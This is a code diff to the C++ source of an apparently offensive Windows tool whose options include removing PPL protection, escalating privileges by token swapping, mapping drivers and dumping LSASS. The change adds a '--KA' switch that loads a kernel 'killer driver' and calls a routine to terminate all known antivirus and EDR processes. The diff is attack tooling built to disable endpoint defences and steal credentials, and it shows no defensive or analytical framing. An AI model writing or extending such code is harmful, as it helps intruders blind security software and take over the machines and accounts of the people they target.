@@ -273,6 +273,8 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	BOOLEAN bAdd{ FALSE };	// true add false remove
 	BOOLEAN bPrivilegeEscalation{ FALSE };
 	BOOLEAN bKillProcess{ FALSE };
+	BOOLEAN bKillAllAvs{ FALSE };
+
 	BOOLEAN bDumpLsass{ FALSE };
 	ULONG nTargetPid{ 0 };
 
@@ -326,6 +328,10 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 			bKillProcess = TRUE;
 		}
+		else if (arg == "--ka" || arg == "--KA")
+		{
+			bKillAllAvs = TRUE;
+		}
 
 		else if (arg == "--map" || 
 			arg == "--m" || 
@@ -354,6 +360,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 				<< "  --ppl -rve <PID>      移除 PPL 保护\n"
 				<< "  --PriEsc <PID>        权限提升\n"
 				<< "  --KillProcess <PID>   结束进程\n"
+				<< "  --KA					结束已知所有反病毒进程\n"
 				<< "  --map <路径>           映射驱动\n"
 				<< "  --dmp                 dmp lsass\n";
 			SetConsoleTextAttribute(hConsole, 7);
@@ -398,6 +405,13 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
+	BOOLEAN bInitKiller{ FALSE };
+	if (bKillAllAvs || bKillProcess)
+	{
+		// load killer driver
+		bInitKiller = DriverWorker::KillerInit();
+	}
+
 	if (bOprOfPPL && bAdd)
 	{
 		DriverLoader::PS_PROTECTION protection{};
@@ -420,9 +434,13 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET);
 		SetConsoleTextAttribute(hConsole, 7);
 	}
-	else if (bKillProcess)
+	else if (bInitKiller && bKillProcess)
 	{
 		DriverWorker::Kill(nTargetPid);
+	}
+	else if (bInitKiller && bKillAllAvs)
+	{
+		DriverLoader::KillAllAvOrEdr();
 	}
 	else if (bMapping)
 	{
